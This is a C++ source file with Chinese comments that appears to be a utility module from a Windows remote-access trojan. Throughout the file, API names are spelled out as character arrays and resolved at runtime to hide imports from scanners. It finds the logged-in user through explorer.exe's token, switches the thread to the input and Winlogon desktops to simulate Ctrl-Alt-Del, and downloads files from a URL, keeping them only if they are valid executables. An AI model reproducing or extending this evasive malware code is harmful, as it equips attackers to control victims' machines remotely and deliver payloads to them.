#if !defined(AFX_UNTIL_CPP_INCLUDED)
#define AFX_UNTIL_CPP_INCLUDED
#include "../stdafx.h"
#include "../Declare.h"   //动态调用库函数
#include <afxwin.h>
#include <process.h>
#include <Tlhelp32.h>
#include <Wtsapi32.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "Wtsapi32.lib")
#include "until.h"
#include "../Myfunction.h"  //自定义函数

extern Myfunction *Gyfunction;

////////////////////////////////////////////////////////////////////////////////////////////////
unsigned int __stdcall ThreadLoader(LPVOID param)
{
	unsigned int	nRet = 0;
#ifdef _DLL
 	try
 	{
#endif	
		THREAD_ARGLIST	arg;
		Gyfunction->my_memcpy(&arg, param, sizeof(arg));
	    char BrmAP23[] = {'S','e','t','E','v','e','n','t','\0'};
	    SetEventT pSetEvent=(SetEventT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP23);
		pSetEvent(arg.hEventTransferArg);
		// 与卓面交互
		if (arg.bInteractive)
			SelectDesktop(NULL);

		nRet = arg.start_address(arg.arglist);
#ifdef _DLL
	}catch(...){};
#endif
	return nRet;
}

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId, 
					   bool bInteractive)
{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	arg;
	arg.start_address = (unsigned ( __stdcall *)( void * ))lpStartAddress;
	arg.arglist = (void *)lpParameter;
	arg.bInteractive = bInteractive;
	char BrmAP22[] = {'C','r','e','a','t','e','E','v','e','n','t','A','\0'};
	CreateEventAT pCreateEventA=(CreateEventAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP22);
	arg.hEventTransferArg = pCreateEventA(NULL, false, false, NULL);
//	hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);

	unsigned  uiThread1ID;
	hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, &uiThread1ID);
    char BrmAP30[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0'};
    WaitForSingleObjectT pWaitForSingleObject=(WaitForSingleObjectT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	pWaitForSingleObject(arg.hEventTransferArg, INFINITE);
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(arg.hEventTransferArg);
	
	return hThread;
}

DWORD GetProcessID(LPCTSTR lpProcessName)
{
	DWORD RetProcessID = 0;
	char SSzlC11[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char SSzlC10[] = {'C','r','e','a','t','e','T','o','o','l','h','e','l','p','3','2','S','n','a','p','s','h','o','t','\0'};
	CreateToolhelp32SnapshotT pCreateToolhelp32Snapshot= (CreateToolhelp32SnapshotT)GetProcAddress(LoadLibrary(SSzlC11),SSzlC10);
	HANDLE handle=pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32* info=new PROCESSENTRY32;
	info->dwSize=sizeof(PROCESSENTRY32);

	char MyProcess32Next[] ={'P','r','o','c','e','s','s','3','2','N','e','x','t','\0'};
	Process32NextT pProcess32Next= (Process32NextT)GetProcAddress(LoadLibrary(SSzlC11),MyProcess32Next);
	char MyProcess32First[] ={'P','r','o','c','e','s','s','3','2','F','i','r','s','t','\0'};
	Process32FirstT pProcess32First= (Process32FirstT)GetProcAddress(LoadLibrary(SSzlC11),MyProcess32First);

	char CPolQ16[] = {'l','s','t','r','c','m','p','i','A','\0'};
	lstrcmpiAT plstrcmpiA=(lstrcmpiAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ16);
	if(pProcess32First(handle,info))
	{
		if (Gyfunction->my_stricmp(info->szExeFile,lpProcessName) == 0)
		{
			RetProcessID = info->th32ProcessID;
			return RetProcessID;
		}
		while(pProcess32Next(handle,info) != FALSE)
		{
			if (plstrcmpiA(info->szExeFile,lpProcessName) == 0)
			{
				RetProcessID = info->th32ProcessID;
				return RetProcessID;
			}
		}
		
	}

	return RetProcessID;
}

char *GetLogUserXP()
{
	TCHAR	*szLogName = NULL;
	DWORD	dwSize = 0;
	char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);

	char DYrEN11[] = {'W','T','S','F','r','e','e','M','e','m','o','r','y','\0'};
	WTSFreeMemoryT pWTSFreeMemory=(WTSFreeMemoryT)GetProcAddress(LoadLibrary("WTSAPI32.dll"),DYrEN11);

	char DYrEN12[] = {'W','T','S','Q','u','e','r','y','S','e','s','s','i','o','n','I','n','f','o','r','m','a','t','i','o','n','A','\0'};
	WTSQuerySessionInformationAT pWTSQuerySessionInformationA=(WTSQuerySessionInformationAT)GetProcAddress(LoadLibrary("WTSAPI32.dll"),DYrEN12);
	if (pWTSQuerySessionInformationA(WTS_CURRENT_SERVER_HANDLE, WTS_CURRENT_SESSION, WTSUserName, &szLogName, &dwSize))
	{
		char	*lpUser = new char[256];
		plstrcpyA(lpUser, szLogName);
		pWTSFreeMemory(szLogName);
		return lpUser;
	}
	else
		return NULL;
}

char *GetLogUser2K()
{
	DWORD	dwProcessID = GetProcessID("explorer.exe");
	if (dwProcessID == 0)
		return NULL;
	
	BOOL fResult  = FALSE;
    HANDLE hProc  = NULL;
	HANDLE hToken = NULL;
	TOKEN_USER *pTokenUser = NULL;
	char	*lpUserName = NULL;

	char FBwWp14[] = {'O','p','e','n','P','r','o','c','e','s','s','\0'};
	OpenProcessT pOpenProcess=(OpenProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp14);
	char CtxPW35[] = {'O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n','\0'};
	OpenProcessTokenT pOpenProcessToken=(OpenProcessTokenT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW35);
	char JtQBs02[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JtQBs02);
	char JwFNw01[] = {'G','e','t','T','o','k','e','n','I','n','f','o','r','m','a','t','i','o','n','\0'};
	GetTokenInformationT pGetTokenInformation=(GetTokenInformationT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw01);
	__try
	{
        // Open the process with PROCESS_QUERY_INFORMATION access
        hProc = pOpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
        if (hProc == NULL)
		{
			__leave;
		}
        fResult = pOpenProcessToken(hProc, TOKEN_QUERY, &hToken);
        if(!fResult)  
		{
			__leave;
		}
		
		DWORD dwNeedLen = 0;		
		fResult = pGetTokenInformation(hToken,TokenUser, NULL, 0, &dwNeedLen);
		if (dwNeedLen > 0)
		{
			pTokenUser = (TOKEN_USER*)new BYTE[dwNeedLen];
			fResult = pGetTokenInformation(hToken,TokenUser, pTokenUser, dwNeedLen, &dwNeedLen);
			if (!fResult)
			{
				__leave;
			}
		}
		else
		{
			__leave;
		}
		
		SID_NAME_USE sn;
		TCHAR szDomainName[MAX_PATH];
		DWORD dwDmLen = MAX_PATH;
		
		DWORD	nNameLen = 256;
		lpUserName = new char[256];
		char JwFNw06[] = {'L','o','o','k','u','p','A','c','c','o','u','n','t','S','i','d','A','\0'};
	    LookupAccountSidAT pLookupAccountSidA=(LookupAccountSidAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw06);
		fResult = pLookupAccountSidA(NULL, pTokenUser->User.Sid, lpUserName, &nNameLen,
			szDomainName, &dwDmLen, &sn);
	}
	__finally
	{
		if (hProc)
//			::CloseHandle(hProc);
		    pCloseHandle(hProc);
		if (hToken)
//			::CloseHandle(hToken);
		    pCloseHandle(hToken);
		if (pTokenUser)
			delete[] (char*)pTokenUser;

	}
    return lpUserName;
}

char *GetCurrentLoginUser()
{
	OSVERSIONINFOEX    OsVerInfo;
	ZeroMemory(&OsVerInfo, sizeof(OSVERSIONINFOEX));
	OsVerInfo.dwOSVersionInfoSize=sizeof(OSVERSIONINFOEX);
	char FBwWp05[] = {'G','e','t','V','e','r','s','i','o','n','E','x','A','\0'};
	GetVersionExAT pGetVersionExA=(GetVersionExAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp05);
	if(!pGetVersionExA((OSVERSIONINFO *)&OsVerInfo))
	{
		OsVerInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		if(!pGetVersionExA((OSVERSIONINFO *)&OsVerInfo))
			return NULL;
	}
	
	if(OsVerInfo.dwMajorVersion == 5 && OsVerInfo.dwMinorVersion == 0)
		return GetLogUser2K();
	else
		return GetLogUserXP();
	
}

BOOL SwitchInputDesktop()
{
 	BOOL	bRet = false;
 	DWORD	dwLengthNeeded;

	HDESK	hOldDesktop, hNewDesktop;
	char	strCurrentDesktop[256], strInputDesktop[256];

	char CPolQ17[] = {'G','e','t','C','u','r','r','e','n','t','T','h','r','e','a','d','I','d','\0'};
	GetCurrentThreadIdT pGetCurrentThreadId=(GetCurrentThreadIdT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ17);
	char DYrEN62[] = {'G','e','t','T','h','r','e','a','d','D','e','s','k','t','o','p','\0'};
	GetThreadDesktopT pGetThreadDesktop=(GetThreadDesktopT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN62);
	hOldDesktop = pGetThreadDesktop(pGetCurrentThreadId());
	memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));

	char DYrEN61[] = {'G','e','t','U','s','e','r','O','b','j','e','c','t','I','n','f','o','r','m','a','t','i','o','n','A','\0'};
	GetUserObjectInformationAT pGetUserObjectInformationA=(GetUserObjectInformationAT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN61);
	pGetUserObjectInformationA(hOldDesktop, UOI_NAME, &strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded);


	char JtQBs06[] = {'O','p','e','n','I','n','p','u','t','D','e','s','k','t','o','p','\0'};
	OpenInputDesktopT pOpenInputDesktop=(OpenInputDesktopT)GetProcAddress(LoadLibrary("USER32.dll"),JtQBs06);
//	hNewDesktop = pOpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	hNewDesktop = pOpenInputDesktop(1, FALSE, 0x1FF);
	memset(strInputDesktop, 0, sizeof(strInputDesktop));
	pGetUserObjectInformationA(hNewDesktop, UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);

	char CPolQ16[] = {'l','s','t','r','c','m','p','i','A','\0'};
	lstrcmpiAT plstrcmpiA=(lstrcmpiAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ16);

	char DYrEN70[] = {'S','e','t','T','h','r','e','a','d','D','e','s','k','t','o','p','\0'};
	SetThreadDesktopT pSetThreadDesktop=(SetThreadDesktopT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN70);
	if (plstrcmpiA(strInputDesktop, strCurrentDesktop) != 0)
	{
		pSetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	char DYrEN69[] = {'C','l','o','s','e','D','e','s','k','t','o','p','\0'};
	CloseDesktopT pCloseDesktop=(CloseDesktopT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN69);
	pCloseDesktop(hOldDesktop);

	pCloseDesktop(hNewDesktop);


	return bRet;
}

BOOL SelectHDESK(HDESK new_desktop)
{
	char CPolQ17[] = {'G','e','t','C','u','r','r','e','n','t','T','h','r','e','a','d','I','d','\0'};
	GetCurrentThreadIdT pGetCurrentThreadId=(GetCurrentThreadIdT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ17);
	char DYrEN62[] = {'G','e','t','T','h','r','e','a','d','D','e','s','k','t','o','p','\0'};
	GetThreadDesktopT pGetThreadDesktop=(GetThreadDesktopT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN62);
	HDESK old_desktop = pGetThreadDesktop(pGetCurrentThreadId());
	
	DWORD dummy;
	char new_name[256];
	
	char DYrEN61[] = {'G','e','t','U','s','e','r','O','b','j','e','c','t','I','n','f','o','r','m','a','t','i','o','n','A','\0'};
	GetUserObjectInformationAT pGetUserObjectInformationA=(GetUserObjectInformationAT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN61);
	if (!pGetUserObjectInformationA(new_desktop, UOI_NAME, &new_name, 256, &dummy)) {
		return FALSE;
	}
	
	// Switch the desktop
	char DYrEN70[] = {'S','e','t','T','h','r','e','a','d','D','e','s','k','t','o','p','\0'};
	SetThreadDesktopT pSetThreadDesktop=(SetThreadDesktopT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN70);
	if(!pSetThreadDesktop(new_desktop)) {
		return FALSE;
	}
	
	// Switched successfully - destroy the old desktop
	char DYrEN69[] = {'C','l','o','s','e','D','e','s','k','t','o','p','\0'};
	CloseDesktopT pCloseDesktop=(CloseDesktopT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN69);
	pCloseDesktop(old_desktop);
	
	return TRUE;
}

// - SelectDesktop(char *)
// Switches the current thread into a different desktop, by name
// Calling with a valid desktop name will place the thread in that desktop.
// Calling with a NULL name will place the thread in the current input desktop.

BOOL SelectDesktop(char *name)
{
	HDESK desktop;
	
	char JtQBs06[] = {'O','p','e','n','I','n','p','u','t','D','e','s','k','t','o','p','\0'};
	OpenInputDesktopT pOpenInputDesktop=(OpenInputDesktopT)GetProcAddress(LoadLibrary("USER32.dll"),JtQBs06);

    char DYrEN63[] = {'O','p','e','n','D','e','s','k','t','o','p','A','\0'};
    OpenDesktopAT pOpenDesktopA=(OpenDesktopAT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN63);
	if (name != NULL)
	{
		// Attempt to open the named desktop
/*		desktop = pOpenDesktopA(name, 0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
			*/
		desktop = pOpenDesktopA(name, 0, FALSE,
			0x1FF);
	}
	else
	{
		// No, so open the input desktop
/*		desktop = pOpenInputDesktop(0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
			*/
		desktop = pOpenInputDesktop(1, FALSE,
			0x1FF);
	}
	
	// Did we succeed?
	if (desktop == NULL) {
		return FALSE;
	}
	
	// Switch to the new desktop
	char DYrEN69[] = {'C','l','o','s','e','D','e','s','k','t','o','p','\0'};
	CloseDesktopT pCloseDesktop=(CloseDesktopT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN69);
	if (!SelectHDESK(desktop)) {
		// Failed to enter the new desktop, so free it!
		pCloseDesktop(desktop);
		return FALSE;
	}
	
	// We successfully switched desktops!
	return TRUE;
}

BOOL SimulateCtrlAltDel()
{
	char CPolQ17[] = {'G','e','t','C','u','r','r','e','n','t','T','h','r','e','a','d','I','d','\0'};
	GetCurrentThreadIdT pGetCurrentThreadId=(GetCurrentThreadIdT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ17);
	char DYrEN62[] = {'G','e','t','T','h','r','e','a','d','D','e','s','k','t','o','p','\0'};
	GetThreadDesktopT pGetThreadDesktop=(GetThreadDesktopT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN62);
	HDESK old_desktop = pGetThreadDesktop(pGetCurrentThreadId());
	
	// Switch into the Winlogon desktop
	if (!SelectDesktop("Winlogon"))
	{
		return FALSE;
	}
	
	// Fake a hotkey event to any windows we find there.... :(
	// Winlogon uses hotkeys to trap Ctrl-Alt-Del...
	char DYrEN65[] = {'P','o','s','t','M','e','s','s','a','g','e','A','\0'};
	PostMessageAT pPostMessageA=(PostMessageAT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN65);
	pPostMessageA(HWND_BROADCAST, WM_HOTKEY, 0, MAKELONG(MOD_ALT | MOD_CONTROL, VK_DELETE));
	
	// Switch back to our original desktop
	if (old_desktop != NULL)
		SelectHDESK(old_desktop);
	
	return TRUE;
}
BOOL http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
	HINTERNET	hInternet, hUrl;
	HANDLE		hFile;
	char		buffer[1024];
	DWORD		dwBytesRead = 0;
	DWORD		dwBytesWritten = 0;
	BOOL		bIsFirstPacket = true;
	BOOL		bRet = true;
	
	char sIQkS10[] = {'M','o','z','i','l','l','a','/','4','.','0',' ','(','c','o','m','p','a','t','i','b','l','e',')','\0'};
	
	char DYrEN04[] = {'I','n','t','e','r','n','e','t','O','p','e','n','A','\0'};
	InternetOpenAT pInternetOpenA=(InternetOpenAT)GetProcAddress(LoadLibrary("WININET.dll"),DYrEN04);
	hInternet = pInternetOpenA(sIQkS10, INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);
	if (hInternet == NULL)
		return false;
	

	char DYrEN03[] = {'I','n','t','e','r','n','e','t','O','p','e','n','U','r','l','A','\0'};
	InternetOpenUrlAT pInternetOpenUrlA=(InternetOpenUrlAT)GetProcAddress(LoadLibrary("WININET.dll"),DYrEN03);
	hUrl = pInternetOpenUrlA(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (hUrl == NULL)
		return false;
	
	  char Wffkl08[] = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
	  CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl08);
	hFile = pCreateFileA(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

	char HvnXs02[] = {'W','r','i','t','e','F','i','l','e','\0'};
	WriteFileT pWriteFile=(WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),HvnXs02);
	char DYrEN02[] = {'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e','\0'};
	InternetReadFileT pInternetReadFile=(InternetReadFileT)GetProcAddress(LoadLibrary("WININET.dll"),DYrEN02);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			memset(buffer, 0, sizeof(buffer));
			pInternetReadFile(hUrl, buffer, sizeof(buffer), &dwBytesRead);
			// 由判断第一个数据包是不是有效的PE文件
			if (bIsFirstPacket && ((PIMAGE_DOS_HEADER)buffer)->e_magic != IMAGE_DOS_SIGNATURE)
			{
				bRet = false;
				break;
			}
			bIsFirstPacket = false;
			
			pWriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
		} while(dwBytesRead > 0);
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
		pCloseHandle(hFile);
	}
    char DYrEN01[] = {'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e','\0'};
	InternetCloseHandleT pInternetCloseHandle=(InternetCloseHandleT)GetProcAddress(LoadLibrary("WININET.dll"),DYrEN01);
	pInternetCloseHandle(hUrl);
	pInternetCloseHandle(hInternet);
	
	return bRet;
}

#endif // !defined(AFX_UNTIL_CPP_INCLUDED)